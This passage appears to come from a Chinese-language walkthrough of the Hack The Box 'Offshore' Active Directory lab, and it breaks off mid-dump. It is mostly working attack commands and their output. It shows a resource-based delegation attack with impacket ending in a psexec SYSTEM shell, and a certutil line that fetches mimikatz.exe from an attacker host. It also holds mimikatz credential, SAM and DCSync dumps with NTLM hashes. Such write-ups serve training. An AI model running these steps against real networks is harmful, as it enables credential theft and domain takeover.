SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : WS03$
         * Domain   : DEV
         * NTLM     : 5cf7b4d94646e8efba50f45b88c12608
         * SHA1     : a5a4af8878d41121c92276621936e935805b2f92
        tspkg :
        wdigest :
         * Username : WS03$
         * Domain   : DEV
         * Password : //!obSC:Ab-)eG,uYeUYAW>W-yGzM7+VeKU5Ml+HTM>uy8%ewS] RQ;HKMO;yX=M+[=-reS8vebmM;u=evFV*nBThY?V`hf0ws'gE]Q.p0C#nR_4F4Iqy#*&
        kerberos :
         * Username : ws03$
         * Domain   : DEV.ADMIN.OFFSHORE.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 46555 (00000000:0000b5db)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 3/7/2026 11:42:01 PM
SID               : 
        msv :
         [00000003] Primary
         * Username : WS03$
         * Domain   : DEV
         * NTLM     : 5cf7b4d94646e8efba50f45b88c12608
         * SHA1     : a5a4af8878d41121c92276621936e935805b2f92
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WS03$
Domain            : DEV
Logon Server      : (null)
Logon Time        : 3/7/2026 11:42:00 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : WS03$
         * Domain   : DEV
         * Password : //!obSC:Ab-)eG,uYeUYAW>W-yGzM7+VeKU5Ml+HTM>uy8%ewS] RQ;HKMO;yX=M+[=-reS8vebmM;u=evFV*nBThY?V`hf0ws'gE]Q.p0C#nR_4F4Iqy#*&
        kerberos :
         * Username : ws03$
         * Domain   : DEV.ADMIN.OFFSHORE.COM
         * Password : (null)
        ssp :
        credman :


mimikatz #
```

得到joe 的 NTLM 哈希值：31d6cfe0d16ae931b73c59d7e0c089c0

## Chrome
```plain
proxychains -q xfreerdp \
/v:172.16.2.102 \
/u:joe \
/d:DEV.ADMIN.OFFSHORE.COM \
/p:'' \
/cert:ignore \
/sec:rdp 
```

![](/image/prolabs/Offshore-72.png)

在Password凭据中发现flag

如果密码错误没成功自行在域控DC02中修改Joe密码

## Getflag
```plain
OFFSHORE{d0nt_s@ve_p@ssw0rds_1n_br0ws3rs!}
```

## RBCD
### 添加机器用户
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore] 
└─# proxychains -q impacket-addcomputer  DEV.ADMIN.OFFSHORE.COM/joe:''  -dc-ip 172.16.2.6  -computer-name 'ATTACKBOX$'  -computer-pass 'Passw0rd!' 
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies Password: 
[*] Successfully added machine account ATTACKBOX$ with password Passw0rd!.
```

### 配置 RBCD 委派关系
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q impacket-rbcd \
-action write \
-delegate-from 'ATTACKBOX$' \
-delegate-to 'DC02$' \
-dc-ip 172.16.2.6 \
-hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 \ 
DEV.ADMIN.OFFSHORE.COM/joe
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ATTACKBOX$ can now impersonate users on DC02$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ATTACKBOX$   (S-1-5-21-1416445593-394318334-2645530166-12601)

```

已成功修改 msDS-AllowedToActOnBehalfOfOtherIdentity 的提示。这表示 DC02 的属性已修改创建，它现在信任ATTACKBOX

### 获取模拟管理员的 Service Ticket (ST)
一旦委派关系建立，你就需要让 ATTACKBOX$ 伪装成 Administrator 去申请访问 DC02 的票据。

+ **计算 ****ATTACKBOX$**** 的 NT Hash** (如果你之前忘了算)：  
密码是 Passw0rd!，其 NT Hash 为：e52cac67419a9a224a3b108f3f621960。

**执行 ****getST.py**：

+  code Bash

```plain
# 确保清理之前的票据环境变量
unset KRB5CCNAME 

┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q impacket-getST \
DEV.ADMIN.OFFSHORE.COM/ATTACKBOX\$:'Passw0rd!' \
-dc-ip 172.16.2.6 \
-spn cifs/dc02.dev.admin.offshore.com \
-impersonate Administrator
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc02.dev.admin.offshore.com@DEV.ADMIN.OFFSHORE.COM.ccache

```

执行成功后，目录下会生成  Administrator@cifs_dc02.dev.admin.offshore.com@DEV.ADMIN.OFFSHORE.COM.ccache

---

### 使用票据横向移动
这是最后的一步，使用生成的票据通过 Kerberos 协议登录域控。

**导入票据到当前环境变量**：

+  code Bash

```plain
export KRB5CCNAME=Administrator@cifs_dc02.dev.admin.offshore.com@DEV.ADMIN.OFFSHORE.COM.ccache
```

+ **确认本地解析**（非常重要，Kerberos 依赖主机名）：  
确保你的 /etc/hosts 中有这一行：  
172.16.2.6 dc02.dev.admin.offshore.com dc02

**获取 Shell**：

+  code Bash

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q impacket-psexec \
-k -no-pass \
-dc-ip 172.16.2.6 \
'dc02.dev.admin.offshore.com'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc02.dev.admin.offshore.com.....
[*] Found writable share ADMIN$
[*] Uploading file UhPLISLY.exe
[*] Opening SVCManager on dc02.dev.admin.offshore.com.....
[*] Creating service tjnx on dc02.dev.admin.offshore.com.....
[*] Starting service tjnx.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```





# 172.16.3.5(Windows)（Setp:11）
## 端口扫描
```c
*Evil-WinRM* PS C:\Users\Administrator\Documents>
$ip = "172.16.3.5"
1..65535 | ForEach-Object {
    $port = $_
    $client = New-Object System.Net.Sockets.TcpClient
    $iar = $client.BeginConnect($ip, $port, $null, $null)

    if ($iar.AsyncWaitHandle.WaitOne(10, $false)) {
        try {
            $client.EndConnect($iar)
            Write-Output "Port open $port"
        } catch {}
    }

    $client.Close()
}
Port open 53
Port open 88
Port open 135
Port open 139
Port open 389
Port open 445
Port open 464
Port open 593
Port open 636
Port open 3268
Port open 3269
Port open 3389
Port open 5985
Port open 9389
Port open 47001
Port open 49664
Port open 49665
Port open 49666
Port open 49668
Port open 49671
Port open 49676
Port open 49677
Port open 49678
Port open 49681
Port open 49689
Port open 49702
```

## 黄金票据登录
```plain
proxychains -q impacket-psexec \
DEV.ADMIN.OFFSHORE.COM/Administrator@DC03.ADMIN.OFFSHORE.COM \
-k -no-pass
```

## Getflag
```plain
C:\Users\Administrator\Desktop> OFFSHORE{w@tch_th0s3_3xtra_$ids}
```

## mimikatz
```plain
certutil -urlcache -f http://10.10.16.2/mimikatz.exe mimikatz.exe
```

### sekurlsa::logonpasswords
```plain
sekurlsa::logonpasswords
mimikatz # 
Authentication Id : 0 ; 66449 (00000000:00010391)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/8/2026 11:33:48 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : DC03$
         * Domain   : ADMIN
         * NTLM     : a309490aabcffeea561fb1d8b36607d0
         * SHA1     : 6aaabe7d10ac4ce1bd8e57848c3f625c498f502f
        tspkg :
        wdigest :
         * Username : DC03$
         * Domain   : ADMIN
         * Password : (null)
        kerberos :
         * Username : DC03$
         * Domain   : ADMIN.OFFSHORE.COM
         * Password : 8c 80 47 fe 85 29 7c 86 ff 9d 27 70 02 0d 7b ba 13 cd 65 8f a1 e1 dd b9 75 19 97 f8 88 28 91 61 93 b6 b0 96 27 6b 21 63 f6 a9 10 2d af 9b 38 da c1 54 16 d1 c6 54 76 96 29 26 b3 d0 47 80 be 1e 13 ea bf b9 10 0d 4a eb 47 4e 0c 7f bf b3 89 a2 ca bc 83 fe 1e 46 af 87 88 12 57 8b a4 1d 60 0f 5c fb ea c7 0e ae ce bb 14 b9 e3 73 4f c6 56 f3 3a 64 cf 45 eb ce 1d 3f 82 e1 11 3b 2e 2d 97 2c 89 60 e8 5f 74 a0 fe ae 38 64 d6 37 b1 b7 1e 1b 43 5a f6 f8 68 1a 50 10 d1 89 c0 4e 9a c5 44 37 7e 71 35 81 b8 16 ee 13 c2 cf 35 b4 a1 c0 ec 67 b4 e2 3d 27 7b f8 40 d7 da 92 6d 8a 7f 69 6a 04 bb 21 91 e8 f3 23 72 43 4f 4b 46 92 28 49 42 1a a1 f3 93 f2 69 c7 94 22 59 33 e7 02 ef f2 67 66 48 05 b7 d6 25 44 ca c7 4b f3 73 c8 17 d3 70 f4 
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DC03$
Domain            : ADMIN
Logon Server      : (null)
Logon Time        : 3/8/2026 11:33:46 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : DC03$
         * Domain   : ADMIN
         * NTLM     : a309490aabcffeea561fb1d8b36607d0
         * SHA1     : 6aaabe7d10ac4ce1bd8e57848c3f625c498f502f
        tspkg :
        wdigest :
         * Username : DC03$
         * Domain   : ADMIN
         * Password : (null)
        kerberos :
         * Username : dc03$
         * Domain   : ADMIN.OFFSHORE.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 35830 (00000000:00008bf6)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 3/8/2026 11:33:29 PM
SID               : 
        msv :
         [00000003] Primary
         * Username : DC03$
         * Domain   : ADMIN
         * NTLM     : a309490aabcffeea561fb1d8b36607d0
         * SHA1     : 6aaabe7d10ac4ce1bd8e57848c3f625c498f502f
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 3/8/2026 11:33:48 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 66428 (00000000:0001037c)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/8/2026 11:33:48 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : DC03$
         * Domain   : ADMIN
         * NTLM     : a309490aabcffeea561fb1d8b36607d0
         * SHA1     : 6aaabe7d10ac4ce1bd8e57848c3f625c498f502f
        tspkg :
        wdigest :
         * Username : DC03$
         * Domain   : ADMIN
         * Password : (null)
        kerberos :
         * Username : DC03$
         * Domain   : ADMIN.OFFSHORE.COM
         * Password : 8c 80 47 fe 85 29 7c 86 ff 9d 27 70 02 0d 7b ba 13 cd 65 8f a1 e1 dd b9 75 19 97 f8 88 28 91 61 93 b6 b0 96 27 6b 21 63 f6 a9 10 2d af 9b 38 da c1 54 16 d1 c6 54 76 96 29 26 b3 d0 47 80 be 1e 13 ea bf b9 10 0d 4a eb 47 4e 0c 7f bf b3 89 a2 ca bc 83 fe 1e 46 af 87 88 12 57 8b a4 1d 60 0f 5c fb ea c7 0e ae ce bb 14 b9 e3 73 4f c6 56 f3 3a 64 cf 45 eb ce 1d 3f 82 e1 11 3b 2e 2d 97 2c 89 60 e8 5f 74 a0 fe ae 38 64 d6 37 b1 b7 1e 1b 43 5a f6 f8 68 1a 50 10 d1 89 c0 4e 9a c5 44 37 7e 71 35 81 b8 16 ee 13 c2 cf 35 b4 a1 c0 ec 67 b4 e2 3d 27 7b f8 40 d7 da 92 6d 8a 7f 69 6a 04 bb 21 91 e8 f3 23 72 43 4f 4b 46 92 28 49 42 1a a1 f3 93 f2 69 c7 94 22 59 33 e7 02 ef f2 67 66 48 05 b7 d6 25 44 ca c7 4b f3 73 c8 17 d3 70 f4 
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DC03$
Domain            : ADMIN
Logon Server      : (null)
Logon Time        : 3/8/2026 11:33:29 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : DC03$
         * Domain   : ADMIN
         * Password : (null)
        kerberos :
         * Username : dc03$
         * Domain   : ADMIN.OFFSHORE.COM
         * Password : (null)
        ssp :
        credman :

```

### lsadump::sam
```plain
lsadump::sam

mimikatz # Domain : DC03
SysKey : e9bc522745cf4fe3cb1a83e0275a6664
Local SID : S-1-5-21-1141849570-1396446600-2625256174

SAMKey : 2e0b11776632f46ba5166ff632d580a0

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 67e1046be5e785dd9773fb6bbeaad49c

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount
```

### lsadump::dcsync
```plain
lsadump::dcsync /domain:admin.offshore.com /all 

mimikatz # [DC] 'admin.offshore.com' will be the domain
[DC] 'DC03.ADMIN.OFFSHORE.COM' will be the DC server
[DC] Exporting domain 'admin.offshore.com'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : ADMIN


Object RDN           : LostAndFound


Object RDN           : Deleted Objects


Object RDN           : Users


Object RDN           : Computers


Object RDN           : System


Object RDN           : WinsockServices


Object RDN           : RpcServices


Object RDN           : FileLinks


Object RDN           : VolumeTable


Object RDN           : ObjectMoveTable


Object RDN           : Default Domain Policy


Object RDN           : AppCategories


Object RDN           : Meetings


Object RDN           : Policies


Object RDN           : User


Object RDN           : Machine


Object RDN           : User


Object RDN           : Machine


Object RDN           : RAS and IAS Servers Access Check


Object RDN           : File Replication Service


Object RDN           : Dfs-Configuration


Object RDN           : IP Security


Object RDN           : ipsecPolicy{72385230-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecISAKMPPolicy{72385231-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNFA{72385232-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNFA{59319BE2-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecNFA{594272E2-071D-11D3-AD22-0060B0ECCA17}


Object RDN           : ipsecPolicy{72385236-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecISAKMPPolicy{72385237-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNFA{59319C04-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecPolicy{7238523C-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecISAKMPPolicy{7238523D-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNFA{7238523E-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNFA{59319BF3-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecNFA{6A1F5C6F-72B7-11D2-ACF0-0060B0ECCA17}


Object RDN           : ipsecNFA{594272FD-071D-11D3-AD22-0060B0ECCA17}


Object RDN           : ipsecNegotiationPolicy{59319BDF-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecNegotiationPolicy{59319BF0-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecNegotiationPolicy{59319C01-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecNegotiationPolicy{72385233-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNegotiationPolicy{7238523F-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNegotiationPolicy{7238523B-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecFilter{7238523A-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecFilter{72385235-70FA-11D1-864C-14A300000000}


Object RDN           : ComPartitions


Object RDN           : ComPartitionSets


Object RDN           : WMIPolicy


Object RDN           : PolicyTemplate


Object RDN           : SOM


Object RDN           : PolicyType


Object RDN           : WMIGPO


Object RDN           : DomainUpdates


Object RDN           : Operations


Object RDN           : ab402345-d3c3-455d-9ff7-40268a1099b6


Object RDN           : bab5f54d-06c8-48de-9b87-d78b796564e4


Object RDN           : f3dd09dd-25e8-4f9c-85df-12d6d2f2f2f5


Object RDN           : 2416c60a-fe15-4d7a-a61e-dffd5df864d3


Object RDN           : 7868d4c8-ac41-4e05-b401-776280e8e9f1


Object RDN           : 860c36ed-5241-4c62-a18b-cf6ff9994173


Object RDN           : 0e660ea3-8a5e-4495-9ad7-ca1bd4638f9e


Object RDN           : a86fe12a-0f62-4e2a-b271-d27f601f8182


Object RDN           : d85c0bfd-094f-4cad-a2b5-82ac9268475d


Object RDN           : 6ada9ff7-c9df-45c1-908e-9fef2fab008a


Object RDN           : 10b3ad2a-6883-4fa7-90fc-6377cbdc1b26


Object RDN           : 98de1d3e-6611-443b-8b4e-f4337f1ded0b


Object RDN           : f607fd87-80cf-45e2-890b-6cf97ec0e284


Object RDN           : 9cac1f66-2167-47ad-a472-2a13251310e4


Object RDN           : 6ff880d6-11e7-4ed1-a20f-aac45da48650


Object RDN           : 446f24ea-cfd5-4c52-8346-96e170bcb912


Object RDN           : 51cba88b-99cf-4e16-bef2-c427b38d0767


Object RDN           : a3dac986-80e7-4e59-a059-54cb1ab43cb9


Object RDN           : 293f0798-ea5c-4455-9f5d-45f33a30703b


Object RDN           : 5c82b233-75fc-41b3-ac71-c69592e6bf15


Object RDN           : 7ffef925-405b-440a-8d58-35e8cd6e98c3


Object RDN           : 4dfbb973-8a62-4310-a90c-776e00f83222


Object RDN           : 8437C3D8-7689-4200-BF38-79E4AC33DFA0


Object RDN           : 7cfb016c-4f87-4406-8166-bd9df943947f


Object RDN           : f7ed4553-d82b-49ef-a839-2f38a36bb069


Object RDN           : 8ca38317-13a4-4bd4-806f-ebed6acb5d0c


Object RDN           : 3c784009-1f57-4e2a-9b04-6915c9e71961


Object RDN           : 6bcd5678-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5679-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567a-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567b-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567c-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567d-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567e-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567f-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5680-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5681-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5682-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5683-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5684-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5685-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5686-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5687-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5688-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5689-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd568a-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd568b-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd568c-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd568d-8314-11d6-977b-00c04f613221


Object RDN           : 3051c66f-b332-4a73-9a20-2d6a7d6e6a1c


Object RDN           : 3e4f4182-ac5d-4378-b760-0eab2de593e2


Object RDN           : c4f17608-e611-11d6-9793-00c04f613221


Object RDN           : 13d15cf0-e6c8-11d6-9793-00c04f613221


Object RDN           : 8ddf6913-1c7b-4c59-a5af-b9ca3b3d2c4c


Object RDN           : dda1d01d-4bd7-4c49-a184-46f9241b560e


Object RDN           : a1789bfb-e0a2-4739-8cc0-e77d892d080a


Object RDN           : 61b34cb0-55ee-4be9-b595-97810b92b017


Object RDN           : 57428d75-bef7-43e1-938b-2e749f5a8d56


Object RDN           : ebad865a-d649-416f-9922-456b53bbb5b8


Object RDN           : 0b7fb422-3609-4587-8c2e-94b10f67d1bf


Object RDN           : 2951353e-d102-4ea5-906c-54247eeec741


Object RDN           : 71482d49-8870-4cb3-a438-b6fc9ec35d70


Object RDN           : aed72870-bf16-4788-8ac7-22299c8207f1


Object RDN           : f58300d1-b71a-4DB6-88a1-a8b9538beaca


Object RDN           : 231fb90b-c92a-40c9-9379-bacfc313a3e3


Object RDN           : 4aaabc3a-c416-4b9c-a6bb-4b453ab1c1f0


Object RDN           : 9738c400-7795-4d6e-b19d-c16cd6486166


Object RDN           : de10d491-909f-4fb0-9abb-4b7865c0fe80


Object RDN           : b96ed344-545a-4172-aa0c-68118202f125


Object RDN           : 4c93ad42-178a-4275-8600-16811d28f3aa


Object RDN           : c88227bc-fcca-4b58-8d8a-cd3d64528a02


Object RDN           : 5e1574f6-55df-493e-a671-aaeffca6a100


Object RDN           : d262aae8-41f7-48ed-9f35-56bbb677573d


Object RDN           : 82112ba0-7e4c-4a44-89d9-d46c9612bf91


Object RDN           : c3c927a6-cc1d-47c0-966b-be8f9b63d991


Object RDN           : 54afcfb9-637a-4251-9f47-4d50e7021211


Object RDN           : f4728883-84dd-483c-9897-274f2ebcf11e


Object RDN           : ff4f9d27-7157-4cb0-80a9-5d6f2b14c8ff


Object RDN           : 83C53DA7-427E-47A4-A07A-A324598B88F7


Object RDN           : C81FC9CC-0130-4FD1-B272-634D74818133


Object RDN           : E5F9E791-D96D-4FC9-93C9-D53E1DC439BA


Object RDN           : e6d5fd00-385d-4e65-b02d-9da3493ed850


Object RDN           : 3a6b3fbf-3168-4312-a10d-dd5b3393952d


Object RDN           : 7F950403-0AB3-47F9-9730-5D7B0269F9BD


Object RDN           : 434bb40d-dbc9-4fe7-81d4-d57229f7b080


Object RDN           : Windows2003Update


Object RDN           : ActiveDirectoryUpdate


Object RDN           : Password Settings Container


Object RDN           : PSPs


Object RDN           : Domain Controllers


Object RDN           : Infrastructure


Object RDN           : ForeignSecurityPrincipals


Object RDN           : Program Data


Object RDN           : Microsoft


Object RDN           : NTDS Quotas


Object RDN           : Managed Service Accounts


Object RDN           : TPM Devices


Object RDN           : Keys


Object RDN           : Guest

** SAM ACCOUNT **

SAM Username         : Guest
User Account Control : 00010222 ( ACCOUNTDISABLE PASSWD_NOTREQD NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-501
Object Relative ID   : 501

Credentials:

Object RDN           : DefaultAccount

** SAM ACCOUNT **

SAM Username         : DefaultAccount
User Account Control : 00010222 ( ACCOUNTDISABLE PASSWD_NOTREQD NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-503
Object Relative ID   : 503

Credentials:

Object RDN           : Builtin


Object RDN           : S-1-5-4


Object RDN           : S-1-5-11


Object RDN           : Remote Desktop Users

** SAM ACCOUNT **

SAM Username         : Remote Desktop Users
Object Security ID   : S-1-5-32-555
Object Relative ID   : 555

Credentials:

Object RDN           : Network Configuration Operators

** SAM ACCOUNT **

SAM Username         : Network Configuration Operators
Object Security ID   : S-1-5-32-556
Object Relative ID   : 556

Credentials:

Object RDN           : Performance Monitor Users

** SAM ACCOUNT **

SAM Username         : Performance Monitor Users
Object Security ID   : S-1-5-32-558
Object Relative ID   : 558

Credentials:

Object RDN           : Performance Log Users

** SAM ACCOUNT **

SAM Username         : Performance Log Users
Object Security ID   : S-1-5-32-559
Object Relative ID   : 559

Credentials:

Object RDN           : Distributed COM Users

** SAM ACCOUNT **

SAM Username         : Distributed COM Users
Object Security ID   : S-1-5-32-562
Object Relative ID   : 562

Credentials:

Object RDN           : S-1-5-17


Object RDN           : IIS_IUSRS

** SAM ACCOUNT **

SAM Username         : IIS_IUSRS
Object Security ID   : S-1-5-32-568
Object Relative ID   : 568

Credentials:

Object RDN           : Cryptographic Operators

** SAM ACCOUNT **

SAM Username         : Cryptographic Operators
Object Security ID   : S-1-5-32-569
Object Relative ID   : 569

Credentials:

Object RDN           : Event Log Readers

** SAM ACCOUNT **

SAM Username         : Event Log Readers
Object Security ID   : S-1-5-32-573
Object Relative ID   : 573

Credentials:

Object RDN           : Certificate Service DCOM Access

** SAM ACCOUNT **

SAM Username         : Certificate Service DCOM Access
Object Security ID   : S-1-5-32-574
Object Relative ID   : 574

Credentials:

Object RDN           : RDS Remote Access Servers

** SAM ACCOUNT **

SAM Username         : RDS Remote Access Servers
Object Security ID   : S-1-5-32-575
Object Relative ID   : 575

Credentials:

Object RDN           : RDS Endpoint Servers

** SAM ACCOUNT **

SAM Username         : RDS Endpoint Servers
Object Security ID   : S-1-5-32-576
Object Relative ID   : 576

Credentials:

Object RDN           : RDS Management Servers

** SAM ACCOUNT **

SAM Username         : RDS Management Servers
Object Security ID   : S-1-5-32-577
Object Relative ID   : 577

Credentials:

Object RDN           : Hyper-V Administrators

** SAM ACCOUNT **

SAM Username         : Hyper-V Administrators
Object Security ID   : S-1-5-32-578
Object Relative ID   : 578

Credentials:

Object RDN           : Access Control Assistance Operators

** SAM ACCOUNT **

SAM Username         : Access Control Assistance Operators
Object Security ID   : S-1-5-32-579
Object Relative ID   : 579

Credentials:

Object RDN           : Remote Management Users

** SAM ACCOUNT **

SAM Username         : Remote Management Users
Object Security ID   : S-1-5-32-580
Object Relative ID   : 580

Credentials:

Object RDN           : System Managed Accounts Group

** SAM ACCOUNT **

SAM Username         : System Managed Accounts Group
Object Security ID   : S-1-5-32-581
Object Relative ID   : 581

Credentials:

Object RDN           : Storage Replica Administrators

** SAM ACCOUNT **

SAM Username         : Storage Replica Administrators
Object Security ID   : S-1-5-32-582
Object Relative ID   : 582

Credentials:

Object RDN           : Domain Computers

** SAM ACCOUNT **

SAM Username         : Domain Computers
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-515
Object Relative ID   : 515

Credentials:

Object RDN           : Cert Publishers

** SAM ACCOUNT **

SAM Username         : Cert Publishers
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-517
Object Relative ID   : 517

Credentials:

Object RDN           : Domain Users

** SAM ACCOUNT **

SAM Username         : Domain Users
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-513
Object Relative ID   : 513

Credentials:

Object RDN           : Domain Guests

** SAM ACCOUNT **

SAM Username         : Domain Guests
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-514
Object Relative ID   : 514

Credentials:

Object RDN           : RAS and IAS Servers

** SAM ACCOUNT **

SAM Username         : RAS and IAS Servers
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-553
Object Relative ID   : 553

Credentials:

Object RDN           : Incoming Forest Trust Builders

** SAM ACCOUNT **

SAM Username         : Incoming Forest Trust Builders
Object Security ID   : S-1-5-32-557
Object Relative ID   : 557

Credentials:

Object RDN           : Terminal Server License Servers

** SAM ACCOUNT **

SAM Username         : Terminal Server License Servers
Object Security ID   : S-1-5-32-561
Object Relative ID   : 561

Credentials:

Object RDN           : Users

** SAM ACCOUNT **

SAM Username         : Users
Object Security ID   : S-1-5-32-545
Object Relative ID   : 545

Credentials:

Object RDN           : Guests

** SAM ACCOUNT **

SAM Username         : Guests
Object Security ID   : S-1-5-32-546
Object Relative ID   : 546

Credentials:

Object RDN           : Group Policy Creator Owners

** SAM ACCOUNT **

SAM Username         : Group Policy Creator Owners
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-520
Object Relative ID   : 520

Credentials:

Object RDN           : Pre-Windows 2000 Compatible Access

** SAM ACCOUNT **

SAM Username         : Pre-Windows 2000 Compatible Access
Object Security ID   : S-1-5-32-554
Object Relative ID   : 554

Credentials:

Object RDN           : S-1-5-9


Object RDN           : Windows Authorization Access Group

** SAM ACCOUNT **

SAM Username         : Windows Authorization Access Group
Object Security ID   : S-1-5-32-560
Object Relative ID   : 560

Credentials:

Object RDN           : 6E157EDF-4E72-4052-A82A-EC3F91021A22


Object RDN           : Allowed RODC Password Replication Group

** SAM ACCOUNT **

SAM Username         : Allowed RODC Password Replication Group
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-571
Object Relative ID   : 571

Credentials:

Object RDN           : Enterprise Read-only Domain Controllers

** SAM ACCOUNT **

SAM Username         : Enterprise Read-only Domain Controllers
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-498
Object Relative ID   : 498

Credentials:

Object RDN           : Denied RODC Password Replication Group

** SAM ACCOUNT **

SAM Username         : Denied RODC Password Replication Group
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-572
Object Relative ID   : 572

Credentials:

Object RDN           : Cloneable Domain Controllers

** SAM ACCOUNT **

SAM Username         : Cloneable Domain Controllers
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-522
Object Relative ID   : 522

Credentials:

Object RDN           : Protected Users

** SAM ACCOUNT **

SAM Username         : Protected Users
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-525
Object Relative ID   : 525

Credentials:

Object RDN           : Enterprise Key Admins

** SAM ACCOUNT **

SAM Username         : Enterprise Key Admins
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-527
Object Relative ID   : 527

Credentials:

Object RDN           : DnsAdmins

** SAM ACCOUNT **

SAM Username         : DnsAdmins
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-1101
Object Relative ID   : 1101

Credentials:

Object RDN           : DnsUpdateProxy

** SAM ACCOUNT **

SAM Username         : DnsUpdateProxy
